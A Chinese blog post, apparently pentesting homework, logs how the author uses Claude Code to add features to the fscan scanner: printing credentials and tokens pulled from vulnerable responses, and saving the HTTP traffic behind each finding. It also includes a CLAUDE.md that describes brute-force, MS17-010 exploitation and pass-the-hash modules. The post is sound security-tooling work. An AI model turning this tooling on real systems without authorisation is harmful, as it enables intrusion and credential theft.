---
title: "初试渗透测试，尝试构建 AI 渗透工作流"
description: 
date: 2026-02-25T17:53:41+08:00
image: 
math: 
license: 
hidden: false
comments: true
draft: false
---

其实是寒假作业，但是觉得做的东西还是很有意义的，需要好好记录。

作业要求 Code is cheap, show me the talk. 所以秉承这样的观点，并且尽量让工作流 AI 化。

本文中人类的 prompt 将用 Markdown 引用语法标注。

## fscan 二次开发

### 正则提取 poc 响应关键字

本节使用 Claude Sonnet 4.6

[fscan](https://fscan.club/#/) 默认的 yaml 语法是 xray 风格的，没有提取响应的功能。希望给 fscan 补充正则提取响应关键字段的功能。

fork 一下 fscan 的仓库，从 v1.8.4 release 开始开了个 `feat/show-output` 分支，因为听说后续的 main 分支使用体验并不很好。

claude code /init 一下。看了眼感觉不够满意，因为需要补充新增 WebScan 的扫描输出的功能，所以让它补充研究了一下 WebScan 的代码结构，记录在 CLAUDE.md。

> 1. 着重关注一下 WebScan 的代码结构，一并记录在 CLAUDE.md。
> 2.使用 web_search mcp 工具，查看 fscan 文档 <https://fscan.club/#/docs>, 在 CLAUDE.md 中记录 fscan 特有的构建约束的说明，记录常用的构建约束指令。注意遵循此次对 CLAUDE.md 的修改仍然遵循 /init 命令的原则：
>
> - "Focus on the big picture architecture"
> - "Avoid listing every component"
> - "Don't include generic development practices"

此处的 web_search mcp 来自 MiniMax，结果发现在有精确网址的情况下不太好用，claude 自己用 fetch 了。

然后开始 vibe coding。习惯使用 plan mode 先让它讲清楚计划，看了没有很离谱才让它继续写。

> 在 WebScan/ 中通过解析 poc 的响应内容，允许用户在 poc yaml 中使用正则表达式提取和编写 exp 相关的字段。下面给出样例：
>
> ```text
> [+] PocScan http://10.3.4.78:8848 poc-yaml-nacos-multi-check-auth-bypass
>    * accessToken: xxxxxxxxxx
>    * username: xxxxxxxxxx
>    * password: xxxxxxxxxx
> ```

{{< details summary="Plan: Display POC Search-Extracted Variables in Output" >}}

````markdown

Plan: Display POC Search-Extracted Variables in Output

Context

Currently, when a POC succeeds in normal mode (rules-based), named capture groups extracted from HTTP responses via the search regex field are stored in
variableMap for use in subsequent rules but are never displayed to the user. The user wants these extracted values (e.g., access tokens, credentials)
to appear in the scan output below the POC result line:

[+] PocScan http://10.3.4.78:8848 poc-yaml-nacos-multi-check-auth-bypass
 * accessToken: xxxxxxxxxx
 * username: xxxxxxxxxx
 * password: xxxxxxxxxx

Critical File

Only one file needs modification:
/Users/veno/Projects/fscan/WebScan/lib/check.go

Implementation

1. Add "sort" import

In the import block, add "sort" (alphabetically between "regexp" and "strings").

2. Modify executePoc signature

From:
func executePoc(oReq *http.Request, p *Poc) (bool, error, string)
To:
func executePoc(oReq *http.Request, p *Poc) (bool, error, string, map[string]string)

3. Declare searchVars after variableMap (line ~80)

variableMap := make(map[string]interface{})
defer func() { variableMap = nil }()
searchVars := make(map[string]string)  // ADD THIS
variableMap["request"] = req

4. Populate searchVars in DealWithRule closure

Change the search block inside DealWithRule from:
if rule.Search != "" {
 result := doSearch(rule.Search, GetHeader(resp.Headers)+string(resp.Body))
 if len(result) > 0 { // 正则匹配成功
     for k, v := range result {
         variableMap[k] = v
     }
 } else {
     return false, nil
 }
}
To:
if rule.Search != "" {
 result := doSearch(rule.Search, GetHeader(resp.Headers)+string(resp.Body))
 if len(result) > 0 { // 正则匹配成功
     for k, v := range result {
         variableMap[k] = v
         if k != "" { // only named groups; unnamed groups have empty-string key
             searchVars[k] = v
         }
     }
 } else {
     return false, nil
 }
}

5. Update all return statements in executePoc

┌──────┬────────────────────────────────────────┬───────────────────────────────────────┐
│ Line │                  From                  │                  To                   │
├──────┼────────────────────────────────────────┼───────────────────────────────────────┤
│ ~72  │ return false, err, ""                  │ return false, err, "", nil            │
├──────┼────────────────────────────────────────┼───────────────────────────────────────┤
│ ~77  │ return false, err, ""                  │ return false, err, "", nil            │
├──────┼────────────────────────────────────────┼───────────────────────────────────────┤
│ ~86  │ return false, nil, ""                  │ return false, nil, "", nil            │
├──────┼────────────────────────────────────────┼───────────────────────────────────────┤
│ ~100 │ return success, nil, "" (Sets/cluster) │ return success, nil, "", nil          │
├──────┼────────────────────────────────────────┼───────────────────────────────────────┤
│ ~193 │ return success, nil, name (Groups)     │ return success, nil, name, searchVars │
├──────┼────────────────────────────────────────┼───────────────────────────────────────┤
│ ~198 │ return success, nil, "" (Rules final)  │ return success, nil, "", searchVars   │
└──────┴────────────────────────────────────────┴───────────────────────────────────────┘

6. Update CheckMultiPoc to display extracted variables

From:
isVul, _, name := executePoc(task.Req, task.Poc)
if isVul {
 result := fmt.Sprintf("[+] PocScan %s %s %s", task.Req.URL, task.Poc.Name, name)
 common.LogSuccess(result)
}
To:
isVul, _, name, extractedVars := executePoc(task.Req, task.Poc)
if isVul {
 result := fmt.Sprintf("[+] PocScan %s %s %s", task.Req.URL, task.Poc.Name, name)
 if len(extractedVars) > 0 {
     keys := make([]string, 0, len(extractedVars))
     for k := range extractedVars {
         keys = append(keys, k)
     }
     sort.Strings(keys)
     for _, k := range keys {
         result += fmt.Sprintf("\n    * %s: %s", k, extractedVars[k])
     }
 }
 common.LogSuccess(result)
}

Design Decisions

- Sort keys alphabetically: Go map iteration is non-deterministic; sorting ensures consistent, reproducible output.
- Single LogSuccess call: Builds the full multi-line string before calling LogSuccess to prevent interleaving from concurrent goroutines.
fmt.Println/color.Red in SaveLog handle multi-line strings correctly. WriteFile also works with multi-line strings (plain text appends result + "\n";
JSON output: Go's json.Marshal escapes embedded newlines).
- Exclude unnamed groups (k != ""): doSearch can return "" as a key for unnamed capture groups; these are internal and should not appear in output.
- set variables not in searchVars: set variables are added to variableMap directly (not through doSearch), so they can never enter searchVars.
- brute-force path unchanged: clusterpoc already has its own output with credentials in tmpMap.
- Groups mode returns searchVars: For consistency, the groups path also returns searchVars (line 193) so POCs using groups format also display extracted
variables.

Verification

# Build to confirm compilation
go build -o fscan main.go

# Run against a target with a POC that uses search patterns (e.g., nacos auth bypass)
./fscan -h <target> -m webonly -poc poc-yaml-nacos-multi-check-auth-bypass

# Expected: output shows extracted variables indented below the POC result line
````

{{< /details >}}

此处有点问题因为我还没真的写这个模板。应该让它自己写简单的测试用 yaml 和简单的服务进行测试。

{{< details summary="Plan: Display POC Search-Extracted Variables in Output" >}}

````markdown
Plan: Display POC Search-Extracted Variables in Output

Context

Currently, when a POC succeeds in normal mode (rules-based), named capture groups extracted from HTTP responses via the search regex field are stored in
variableMap for use in subsequent rules but are never displayed to the user. The user wants these extracted values (e.g., access tokens, credentials)
to appear in the scan output below the POC result line:

[+] PocScan http://10.3.4.78:8848 poc-yaml-nacos-multi-check-auth-bypass
 * accessToken: xxxxxxxxxx
 * username: xxxxxxxxxx
 * password: xxxxxxxxxx

Critical File

Only one file needs modification:
/Users/veno/Projects/fscan/WebScan/lib/check.go

Implementation

1. Add "sort" import

In the import block, add "sort" (alphabetically between "regexp" and "strings").

2. Modify executePoc signature

From:
func executePoc(oReq *http.Request, p *Poc) (bool, error, string)
To:
func executePoc(oReq *http.Request, p *Poc) (bool, error, string, map[string]string)

3. Declare searchVars after variableMap (line ~80)

variableMap := make(map[string]interface{})
defer func() { variableMap = nil }()
searchVars := make(map[string]string)  // ADD THIS
variableMap["request"] = req

4. Populate searchVars in DealWithRule closure

Change the search block inside DealWithRule from:
if rule.Search != "" {
 result := doSearch(rule.Search, GetHeader(resp.Headers)+string(resp.Body))
 if len(result) > 0 { // 正则匹配成功
     for k, v := range result {
         variableMap[k] = v
     }
 } else {
     return false, nil
 }
}
To:
if rule.Search != "" {
 result := doSearch(rule.Search, GetHeader(resp.Headers)+string(resp.Body))
 if len(result) > 0 { // 正则匹配成功
     for k, v := range result {
         variableMap[k] = v
         if k != "" { // only named groups; unnamed groups have empty-string key
             searchVars[k] = v
         }
     }
 } else {
     return false, nil
 }
}

5. Update all return statements in executePoc

┌──────┬────────────────────────────────────────┬───────────────────────────────────────┐
│ Line │                  From                  │                  To                   │
├──────┼────────────────────────────────────────┼───────────────────────────────────────┤
│ ~72  │ return false, err, ""                  │ return false, err, "", nil            │
├──────┼────────────────────────────────────────┼───────────────────────────────────────┤
│ ~77  │ return false, err, ""                  │ return false, err, "", nil            │
├──────┼────────────────────────────────────────┼───────────────────────────────────────┤
│ ~86  │ return false, nil, ""                  │ return false, nil, "", nil            │
├──────┼────────────────────────────────────────┼───────────────────────────────────────┤
│ ~100 │ return success, nil, "" (Sets/cluster) │ return success, nil, "", nil          │
├──────┼────────────────────────────────────────┼───────────────────────────────────────┤
│ ~193 │ return success, nil, name (Groups)     │ return success, nil, name, searchVars │
├──────┼────────────────────────────────────────┼───────────────────────────────────────┤
│ ~198 │ return success, nil, "" (Rules final)  │ return success, nil, "", searchVars   │
└──────┴────────────────────────────────────────┴───────────────────────────────────────┘

6. Update CheckMultiPoc to display extracted variables

From:
isVul, _, name := executePoc(task.Req, task.Poc)
if isVul {
 result := fmt.Sprintf("[+] PocScan %s %s %s", task.Req.URL, task.Poc.Name, name)
 common.LogSuccess(result)
}
To:
isVul, _, name, extractedVars := executePoc(task.Req, task.Poc)
if isVul {
 result := fmt.Sprintf("[+] PocScan %s %s %s", task.Req.URL, task.Poc.Name, name)
 if len(extractedVars) > 0 {
     keys := make([]string, 0, len(extractedVars))
     for k := range extractedVars {
         keys = append(keys, k)
     }
     sort.Strings(keys)
     for _, k := range keys {
         result += fmt.Sprintf("\n    * %s: %s", k, extractedVars[k])
     }
 }
 common.LogSuccess(result)
}

Design Decisions

- Sort keys alphabetically: Go map iteration is non-deterministic; sorting ensures consistent, reproducible output.
- Single LogSuccess call: Builds the full multi-line string before calling LogSuccess to prevent interleaving from concurrent goroutines.
fmt.Println/color.Red in SaveLog handle multi-line strings correctly. WriteFile also works with multi-line strings (plain text appends result + "\n";
JSON output: Go's json.Marshal escapes embedded newlines).
- Exclude unnamed groups (k != ""): doSearch can return "" as a key for unnamed capture groups; these are internal and should not appear in output.
- set variables not in searchVars: set variables are added to variableMap directly (not through doSearch), so they can never enter searchVars.
- brute-force path unchanged: clusterpoc already has its own output with credentials in tmpMap.
- Groups mode returns searchVars: For consistency, the groups path also returns searchVars (line 193) so POCs using groups format also display extracted
variables.

Verification

Step 1: Create a test POC YAML

Create /Users/veno/Projects/fscan/WebScan/pocs/poc-yaml-test-search-extract.yml:

name: poc-yaml-test-search-extract
transport: http
rules:
- method: GET
 path: /
 expression: status == 200 && body.bcontains(b"fscan-test")
 search: 'token=(?P<token>[a-z0-9]+).*?user=(?P<username>[a-zA-Z]+)'

Step 2: Start a local test HTTP server

Use Python to serve a response containing the expected fields:

python3 -c "
import http.server, socketserver
class H(http.server.BaseHTTPRequestHandler):
 def do_GET(self):
     body = b'fscan-test token=abc123def user=admin'
     self.send_response(200)
     self.end_headers()
     self.wfile.write(body)
 def log_message(self, *a): pass
with socketserver.TCPServer(('', 18080), H) as s:
 s.serve_forever()
" &

Step 3: Build and run

go build -o fscan main.go

./fscan -h 127.0.0.1:18080 -m webonly -pocname poc-yaml-test-search-extract

Expected output

[+] PocScan http://127.0.0.1:18080 poc-yaml-test-search-extract
 * token: abc123def
 * username: admin

Step 4: Cleanup

kill %1  # stop the python server
rm WebScan/pocs/poc-yaml-test-search-extract.yml
````

{{< /details >}}

vibe 完之后看上去效果合理了。

![实现效果](image.png)

过程中 claude 踩了两个坑，它不知道 fscan 的 yaml 会被编译进二进制，当成了 nuclei 类似的外置模板模式。以及 fscan POC 语法中 `expression` 必须用 `response.status` 和 `response.body`，而非裸的 `status/body`。一并将它补进 CLAUDE.md

> 提交，然后在 CLAUDE.md 修复上述错误示例。并且新增说明，fscan 的 poc 模板设计是，yaml 会被编译进二进制，因此写了新模板希望使用，需要重新编译。
> 在 CLAUDE.md 中新补充一点，本项目基于原版新增了我们刚刚实现的 POC YAML 中允许正则提取 exp 关键字的功能相关的描述。并给出语法。

最终 CLAUDE.md 如下：

{{< details summary="CLAUDE.md" >}}

````markdown
# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## 项目概述

fscan 是一个用 Go 语言编写的内网综合扫描工具。支持主机存活探测、端口扫描、服务爆破、漏洞检测（包括 MS17-010、SMB Ghost）、Web 指纹识别，以及基于 YAML 格式的 Web 漏洞扫描（兼容 xray POC 格式）。

## 构建和开发命令

### 构建

```bash
# 标准编译
go build -ldflags="-s -w" -trimpath main.go

# 可选：使用 UPX 压缩体积
upx -9 fscan.exe

# 跨平台编译示例
# Windows 64位
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -trimpath -o fscan_windows_amd64.exe main.go

# Linux 64位
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -trimpath -o fscan_linux_amd64 main.go

# macOS 64位
GOOS=darwin GOARCH=amd64 go build -ldflags="-s -w" -trimpath -o fscan_darwin_amd64 main.go

# macOS ARM64 (Apple Silicon)
GOOS=darwin GOARCH=arm64 go build -ldflags="-s -w" -trimpath -o fscan_darwin_arm64 main.go
```

### 编译参数说明

fscan 使用标准 Go 编译工具链，支持以下编译优化：

**ldflags 参数**：

- `-s`：去除符号表（strip symbol table），减小二进制文件大小
- `-w`：去除 DWARF 调试信息（strip debug info），进一步减小文件大小
- 组合使用 `-ldflags="-s -w"` 可显著减小可执行文件体积（约减少 30-40%）

**trimpath 参数**：

- `-trimpath`：从生成的可执行文件中删除所有文件系统路径
- 提高二进制文件的可重现性和安全性（不泄露本地路径信息）

**构建约束（Build Tags）**：

- fscan 代码库未使用构建标签（build tags），所有功能在所有平台上统一编译
- 跨平台兼容性通过 Go 标准库的平台抽象实现（如 `runtime.GOOS`、`runtime.GOARCH`）
- ICMP 功能在不同平台上使用 `golang.org/x/net/icmp` 包实现跨平台支持
- 某些功能在特定平台上有限制（如 ICMP 需要管理员权限）

**嵌入式资源（Embed）**：

- WebScan 模块使用 `//go:embed pocs` 将 380+ 个 YAML POC 文件嵌入到二进制文件中
- 编译时会自动打包 `WebScan/pocs/` 目录下的所有文件
- 无需额外的资源文件即可分发单个可执行文件

### 常用编译命令组合

```bash
# 开发调试版本（保留调试信息）
go build -o fscan main.go

# 生产发布版本（体积优化）
go build -ldflags="-s -w" -trimpath -o fscan main.go

# 交叉编译所有主流平台
for GOOS in darwin linux windows; do
  for GOARCH in 386 amd64 arm64; do
    # 跳过不支持的组合
    if [ "$GOOS" = "darwin" ] && [ "$GOARCH" = "386" ]; then continue; fi

    output_name="fscan_${GOOS}_${GOARCH}"
    if [ "$GOOS" = "windows" ]; then
      output_name="${output_name}.exe"
    fi

    echo "Building $output_name..."
    GOOS=$GOOS GOARCH=$GOARCH go build -ldflags="-s -w" -trimpath -o $output_name main.go
  done
done

# 编译后使用 UPX 进一步压缩（可选）
upx -9 fscan_*
```

### 依赖管理

```bash
# 下载依赖
go mod download

# 整理依赖（移除未使用的依赖）
go mod tidy

# 验证依赖
go mod verify

# 查看依赖树
go mod graph
```

### 运行

```bash
# 基本扫描
go run main.go -h 192.168.1.1/24

# 指定模块
go run main.go -h 192.168.1.1/24 -m ssh

# 指定端口
go run main.go -h 192.168.1.1/24 -p 22,80,443
```

### 测试

该代码库不包含单元测试。测试通过针对目标环境的手动执行完成。

## 架构总览

### 主要执行流程

1. **输入解析** (`common` 包)：解析命令行参数、IP 范围、端口范围和配置
2. **主机发现** (`Plugins/icmp.go`)：ICMP ping 扫描识别存活主机（可用 `-np` 跳过）
3. **端口扫描** (`Plugins/portscan.go`)：对存活主机进行 TCP 端口扫描
4. **服务检测** (`Plugins/*`)：针对特定协议的扫描和密码爆破
5. **Web 扫描** (`WebScan` 包)：指纹识别和基于 POC 的漏洞检测
6. **输出结果** (`common/log.go`)：结果输出到控制台，可选保存到文件

### 包结构

- **`main.go`**：程序入口，初始化 HostInfo，解析参数，调用 Plugins.Scan()

- **`common/`**：共享配置和工具函数
  - `flag.go`：命令行参数定义
  - `config.go`：默认字典、端口列表和全局状态（版本号、用户字典、密码字典、端口列表）
  - `ParseIP.go`：IP 范围解析（支持 CIDR、范围格式如 192.168.1.1-255、逗号分隔）
  - `ParsePort.go`：端口范围解析
  - `log.go`：带颜色输出的日志记录
  - `proxy.go`：HTTP/SOCKS5 代理配置

- **`Plugins/`**：服务特定的扫描模块
  - `scanner.go`：主调度器，将主机/端口路由到相应的插件
  - `portscan.go`：TCP 端口扫描器
  - `icmp.go`：ICMP ping 扫描用于主机发现
  - `base.go`：PluginList 映射表，注册端口号到扫描函数（如 "22" -> SshScan）
  - 服务扫描器：`ssh.go`、`smb.go`、`mysql.go`、`redis.go`、`ftp.go`、`mssql.go`、`postgres.go`、`oracle.go`、`rdp.go`、`mongodb.go`、`memcached.go`
  - 漏洞利用模块：`ms17010.go`、`ms17010-exp.go`、`CVE-2020-0796.go`（SMB Ghost）
  - `NetBIOS.go`：NetBIOS 枚举和域控识别
  - `webtitle.go`：HTTP 标题抓取和基础 Web 指纹识别
  - `fcgiscan.go`：FastCGI 协议扫描

- **`WebScan/`**：Web 漏洞扫描
  - `WebScan.go`：主入口，从嵌入式文件系统或自定义路径加载 POC
  - `InfoScan.go`：指纹检测
  - `lib/`：POC 引擎实现
    - `check.go`：指纹匹配和 POC 过滤
    - `eval.go`：CEL（通用表达式语言）表达式求值，用于 POC 规则
    - `client.go`：支持代理的 HTTP 客户端
    - `http.pb.go`：HTTP 请求/响应的 Protobuf 定义
  - `pocs/`：包含 380+ 个 YAML POC 文件的目录（使用 `//go:embed` 在编译时嵌入）

### 插件注册系统

插件在 `Plugins/base.go` 中通过 `PluginList` 映射表注册：

```go
var PluginList = map[string]interface{}{
    "22":      SshScan,
    "3306":    MysqlScan,
    "1000001": MS17010,     // 漏洞利用的特殊端口号
    "1000003": WebTitle,    // Web 扫描
    // ...
}
```

扫描器使用反射根据检测到的端口动态调用相应的函数。

### 并发模型

- 主协程池由 `-t` 参数控制（默认：600 个线程）
- `scanner.go` 中的 AddScan 函数使用基于 channel 的信号量限制并发扫描
- 每个服务扫描在自己的 goroutine 中运行
- WaitGroups 确保所有扫描在程序退出前完成
- Mutex 保护共享计数器（common.Num、common.End）

### 重要扫描模式（`-m` 参数）

- `all`（默认）：运行所有模块（ICMP → 端口扫描 → 服务扫描 → Web 扫描）
- `portscan`：仅执行端口扫描
- `icmp`：仅执行主机发现
- `webonly`：跳过端口扫描，直接探测常见 Web 端口的 HTTP/HTTPS
- `ssh`、`mysql`、`redis` 等：针对特定服务
- `ms17010`：扫描 MS17-010 漏洞

### 端口组

`common/config.go` 中的 `PortGroup` 映射定义了预设端口集：

- `main`：常用端口（21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017）
- `db`：数据库端口
- `web`：Web 端口的扩展列表（80、8080、8443 等）
- `service`：常见服务端口

### Web POC 系统

- POC 是兼容 xray 格式的 YAML 文件
- 从嵌入式文件系统（`WebScan/pocs/`）或自定义路径（`-pocpath`）加载
- 使用 CEL 表达式进行匹配和提取
- 支持基于指纹的 POC 选择（仅根据检测到的 CMS/框架运行相关 POC）
- 通过 `-num` 参数限速（默认：20 个并发 POC 检查）

### WebScan 模块架构

WebScan 负责 Web 漏洞扫描，采用 CEL 表达式引擎和模块化设计。

#### 核心组件

- **WebScan.go**：主入口，从 `//go:embed pocs` 或 `-pocpath` 加载 POC，根据指纹过滤并并发执行
- **InfoScan.go**：指纹识别，包含 260+ 条规则（WAF、OA、中间件、CMS），支持 body/headers/cookie 正则匹配
- **lib/check.go**：POC 执行引擎
  - 普通模式：按顺序执行 rules
  - 爆破模式：使用 `sets` 字典生成笛卡尔积（如 Tomcat 弱口令、Shiro key）
  - 支持变量替换 `{{variable}}`、命名捕获组 `(?P<name>...)`、MD5 去重
- **lib/eval.go**：CEL 表达式引擎，30+ 自定义函数
  - 字符串：`bcontains`、`icontains`、`substr`、`startsWith`
  - 编码：`base64`、`urlencode`、`hexdecode`
  - 特殊：`shirokey`、`TDdate`（通达 OA）、`wait`（DNSLog）
- **lib/client.go**：HTTP 客户端，TLS 1.0+，支持 HTTP/SOCKS5 代理，连接池配置
- **info/rules.go**：指纹规则库和 POC 映射表（指纹 -> POC 别名）

#### 工作流程

1. 指纹识别：正则匹配 headers 和 body
2. POC 过滤：根据指纹查询 `PocDatas`，过滤相关 POC
3. 并发执行：worker 池（`-num` 控制）执行 POC，评估 CEL 表达式
4. 结果输出：`[+] PocScan <URL> <POC名称>` 及 `search` 提取的命名变量（每行 `    * key: value`）

#### POC YAML 格式

```yaml
name: poc-yaml-example
set:
  - key: var
    value: "value"
sets:  # 爆破字典（可选）
  - key: user
    value: ["admin", "root"]
rules:
  - method: POST
    path: /api/login
    body: '{"user":"{{user}}"}'
    search: '"token":"(?P<token>.*?)"'  # 命名捕获组
    expression: response.status == 200 && response.body.bcontains(b'success')
```

#### search 字段：正则提取并展示关键变量（本项目扩展）

原版 xray 格式的 `search` 字段仅用于提取命名捕获组并注入到后续 rule 的变量替换中。本项目在此基础上扩展：**所有命名捕获组的值会在 POC 命中时一并打印到输出**，适用于提取 accessToken、凭据、版本号等敏感信息。

**语法**：在任意 rule 中添加 `search` 字段，使用 Python 风格的命名捕获组 `(?P<name>...)`：

```yaml
name: poc-yaml-example-with-extraction
transport: http
rules:
  - method: POST
    path: /api/auth
    body: '{"username":"admin","password":"admin"}'
    search: '"accessToken":"(?P<accessToken>[^"]+)".*?"username":"(?P<username>[^"]+)"'
    expression: response.status == 200 && response.body.bcontains(b'accessToken')
```

命中时输出格式：

```
[+] PocScan http://10.0.0.1:8848 poc-yaml-example-with-extraction
    * accessToken: eyJhbGc...
    * username: nacos
```

**说明**：
- `search` 匹配范围为 `响应头 + 响应体` 的拼接字符串
- 多个 rule 中的 `search` 均会被收集，后续 rule 提取的变量会覆盖同名变量
- 提取的变量同时注入 `variableMap`，可在后续 rule 中通过 `{{varName}}` 引用
- key 按字母序排列输出，空 key（未命名组）自动忽略
- 实现位置：`WebScan/lib/check.go`，函数 `executePoc` 和 `CheckMultiPoc`

#### 特殊机制

- Shiro POC 默认测试 10 个 key（`-full` 测试 100 个），位置：lib/check.go:283
- DNSLog 支持使用 ceye.io，需 `-dns` 参数
- 基于指纹的智能过滤减少无效请求

## 常见开发模式

### 添加新的服务插件

1. 创建 `Plugins/newservice.go`，函数签名为：`func NewServiceScan(info *common.HostInfo)`
2. 在 `Plugins/base.go` 的 PluginList 中注册：`"PORT": NewServiceScan`
3. 在 `common/config.go` 的 PORTList 和 PortGroup 中添加默认端口
4. 如适用，在 `Userdict` 中添加默认凭据

### 添加新的 POC

在 `WebScan/pocs/` 目录中放置 YAML 文件。示例结构：

```yaml
name: poc-name
transport: http
rules:
  - method: GET
    path: /vulnerable/path
    expression: response.status == 200 && response.body.bcontains(b'marker')
```

> **注意**：POC YAML 文件通过 `//go:embed pocs` 在**编译期**嵌入二进制。新增或修改 POC 后，必须重新编译才能生效：
>
> ```bash
> go build -ldflags="-s -w" -trimpath -o fscan main.go
> ```
>
> 如需在不重新编译的情况下临时加载外部 POC，可使用 `-pocpath <目录>` 参数从文件系统加载。

### 错误处理

- 大多数函数使用 `defer recover()` 捕获 panic
- 通过 `common.LogError()` 和 `common.LogSuccess()` 记录错误
- 静默模式（`-silent`）抑制实时输出，用于自动化工具

## 关键全局变量

- `common.Threads`：并发扫描线程数
- `common.Timeout`：TCP 连接超时（默认：3秒）
- `common.WebTimeout`：HTTP 请求超时（默认：5秒）
- `common.NoPing`：跳过 ICMP 主机发现
- `common.NoPoc`：跳过 Web 漏洞扫描
- `common.IsBrute`：跳过密码爆破

## 值得注意的实现细节

- **IP 解析**：支持 /8 范围的智能采样（扫描每个 C 段的 .1 和 .254，加上随机 IP）
- **ICMP 实现**：使用原始套接字和自定义 ICMP 数据包构造（在 Linux/Windows 上需要 root/管理员权限）
- **密码爆破**：默认串行；使用 `-br N` 进行并发尝试（注意账户锁定）
- **MS17-010 利用**：内置 shellcode 生成用于添加用户（`-sc add`），但 README 推荐使用专用工具
- **代理支持**：HTTP 代理（`-proxy`）用于 Web 扫描；SOCKS5（`-socks5`）用于 TCP 连接（并非所有模块都支持）
- **哈希认证**：支持 SMB 的 pass-the-hash（`-hash`）和 WMI 执行

## 安全和授权上下文

此工具专为经授权的渗透测试和安全评估而设计。README 包含了全面的免责声明，要求在使用前获得合法授权。修改漏洞利用模块（ms17010-exp.go 等）时，请确保更改符合道德使用约束。

````

{{</details>}}

### 通过参数保存 http 请求包和响应包

这里的功能感觉不是很复杂，并且架构相关内容已经被 Claude Sonnet 4.6 理清楚了，换了个便宜且快的模型 MiniMax-M2.5 ~~(其实是 Claude 用到限流了)~~。因为只有 10B，平时用起来响应真的快。

先检查了一下文档，发现似乎好像有一些关于输出系统的描述。如果已经有这个功能的话，就不要重复实现了，记录一下怎么用就行。让 M2.5 帮我先查一下。

> 检查 <https://fscan.club/#/docs> 和 fscan --help 中关于输出系统的描述，确认其中将 http
请求响应包保存为文件的描述。如果不存在此功能，请参考分类输出，使用类似的参数风格，新增命令行参数，允许用户保存 poc 触发时所使用的 http 请求响应，注意并不是保存所有扫描的 http 请求响应。之后启动一个 python 服务，编写测试用 poc-yaml，测试该参数。在一切确认完成之后，在 CLAUDE.md 中精简描述新增的这一功能。

{{< details summary="POC 请求响应保存功能实现计划" >}}

````markdown
POC 请求响应保存功能实现计划

背景

用户希望在 fscan 中新增功能：当 POC 扫描命中漏洞时，能够保存触发漏洞所使用的 HTTP 请求和响应到本地文件。

经检查：
- https://fscan.club/#/docs 网站无有用内容
- fscan --help 中无此功能描述
- 当前 fscan 版本（1.8.4）不支持保存 HTTP 请求响应

实现方案

1. 新增命令行参数

参考现有参数风格（单破折号 - 前缀），新增：

// common/flag.go 第70行附近
flag.StringVar(&PocSavePath, "hs", "", "save poc http request and response to file when poc hits")

参数说明：
- -hs: http save，指定保存目录路径（当 POC 命中时自动创建文件）

2. 定义全局变量

// common/config.go 第134行附近
var PocSavePath string  // 保存目录路径

3. 核心实现

3.1 修改 executePoc 函数签名

在 WebScan/lib/check.go 中，修改 executePoc 函数返回额外信息：

// 修改前
func executePoc(oReq *http.Request, p *Poc) (bool, error, string, map[string]string)

// 修改后
func executePoc(oReq *http.Request, p *Poc) (bool, error, string, map[string]string, *http.Request, *Response)

返回的两个额外值为：
- *http.Request: 最后执行的请求（用于保存）
- *Response: 最后执行的响应（用于保存）

3.2 修改 CheckMultiPoc 函数

在 CheckMultiPoc 函数（第29-64行）中：
1. 接收返回的 request 和 response
2. 当 isVul 为 true 且 PocSavePath 不为空时，保存请求响应

3.3 保存函数实现

创建保存函数 savePocHttpInfo：

func savePocHttpInfo(req *http.Request, resp *Response, pocName, savePath string) error {
 // 1. 创建目录（如果不存在）
 os.MkdirAll(savePath, 0755)

 // 2. 生成文件名
 urlHash := md5.Sum([]byte(req.URL.String()))
 timestamp := time.Now().Unix()
 filename := fmt.Sprintf("%s_%x_%d.txt", pocName, urlHash, timestamp)
 filepath := filepath.Join(savePath, filename)

 // 3. 格式化请求响应内容
 var content strings.Builder
 content.WriteString("============== Request ==============\n")
 content.WriteString(fmt.Sprintf("%s %s HTTP/1.1\n", req.Method, req.URL.RequestURI()))
 content.WriteString(fmt.Sprintf("Host: %s\n", req.Host))
 for k, v := range req.Header {
     content.WriteString(fmt.Sprintf("%s: %s\n", k, strings.Join(v, ", ")))
 }
 if req.Body != nil {
     body, _ := io.ReadAll(req.Body)
     content.WriteString("\n")
     content.WriteString(string(body))
 }

 content.WriteString("\n\n============== Response ==============\n")
 content.WriteString(fmt.Sprintf("HTTP/1.1 %d %s\n", resp.Status, http.StatusText(resp.Status)))
 for k, v := range resp.Headers {
     content.WriteString(fmt.Sprintf("%s: %s\n", k, v))
 }
 content.WriteString("\n")
 content.WriteString(string(resp.Body))

 // 4. 写入文件
 return os.WriteFile(filepath, []byte(content.String()), 0644)
}

4. 文件命名策略

为避免文件名冲突和覆盖，使用：
{poc_name}_{md5(url)}_{timestamp}.txt

例如：poc-weblogic_1a2b3c4d_1709000000.txt

5. 关键代码位置

┌──────────────────────┬────────┬───────────────────────────────────────┐
│         文件         │  行号  │               修改内容                │
├──────────────────────┼────────┼───────────────────────────────────────┤
│ common/flag.go       │ ~70    │ 添加 -hs 参数定义                     │
├──────────────────────┼────────┼───────────────────────────────────────┤
│ common/config.go     │ ~134   │ 添加 PocSavePath 变量                 │
├──────────────────────┼────────┼───────────────────────────────────────┤
│ WebScan/lib/check.go │ ~66    │ 修改 executePoc 函数签名和返回        │
├──────────────────────┼────────┼───────────────────────────────────────┤
│ WebScan/lib/check.go │ ~29-64 │ 修改 CheckMultiPoc 函数调用和保存逻辑 │
├──────────────────────┼────────┼───────────────────────────────────────┤
│ WebScan/lib/check.go │ 新增   │ 添加 savePocHttpInfo 函数             │
└──────────────────────┴────────┴───────────────────────────────────────┘

6. 依赖

需要添加以下 import：
import (
 "crypto/md5"
 "path/filepath"
 "time"
)

测试计划

6.1 启动 Python HTTP 测试服务

# 创建简单的 Python HTTP 服务
python3 -m http.server 8080

6.2 编写测试 POC YAML

在 WebScan/pocs/ 或使用 -pocpath 指定目录，创建测试 POC：

name: poc-test-save-http
set:
- key: test
 value: "test"
rules:
- method: GET
 path: /test
 expression: response.status == 200 && response.body.bcontains(b"test")

6.3 运行测试

fscan -hs ./poc-output -u http://localhost:8080 -pocname poc-test-save-http

6.4 验证

1. 检查 ./poc-output 目录是否生成文件
2. 验证文件内容包含完整的请求和响应

CLAUDE.md 更新

在 CLAUDE.md 的 "Web POC 系统" 部分添加：

#### POC 请求响应保存

当 POC 命中时，可使用 `-hs <目录>` 参数保存触发漏洞的 HTTP 请求和响应：

```bash
fscan -hs ./poc-output -u http://target.com -pocname weLOGIC
```

